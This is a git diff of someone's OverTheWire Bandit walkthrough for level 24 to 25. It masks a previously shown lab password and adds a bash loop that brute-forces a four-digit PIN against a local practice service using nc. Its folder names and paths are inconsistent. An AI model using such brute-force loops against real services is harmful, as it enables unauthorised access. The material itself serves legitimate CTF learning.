@@ -425,19 +425,33 @@ exit
 ## Level 24 `->` 25
 
 ```bash
-#echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000" | nc bandit.labs.overthewire.org 30002
-#echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000" | openssl s_client -connect bandit.labs.overthewire.org:30002
+#echo "******************************** 0000" | nc bandit.labs.overthewire.org 30002
+#echo "******************************** 0000" | openssl s_client -connect bandit.labs.overthewire.org:30002
 #ssh bandit23@bandit.labs.overthewire.org -p 2220
-#echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000" | openssl s_client -connect localhost:30002
-#"VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000" | nc localhost 30002
+#echo "******************************** 0000" | openssl s_client -connect localhost:30002
+#"******************************** 0000" | nc localhost 30002
 #nc localhost 30002
 
-mkdir /tmp/gatvosky23
-cd /tmp/gatovsky23
+mkdir /tmp/gatvosky24
+cd /tmp/gatovsky24
 touch passpin.txt
 vim generarpin.sh
-bash generarpin.sh
+```
+
+```bash
+#!/bin/bash
+#Author: Gatovsky
+
+for ((i = 0; i <= 10000; i++)); do
+        printf ******************************** >> passpin.txt
+        printf " %.4d\n" $i >> passpin.txt
+done 
+
 nc localhost 30002 < /tmp/gatovsky23/passpin.txt
+```
+
+```bash
+bash generarpin.sh
 Correct!
 The password of user bandit25 is ********************************
 ```
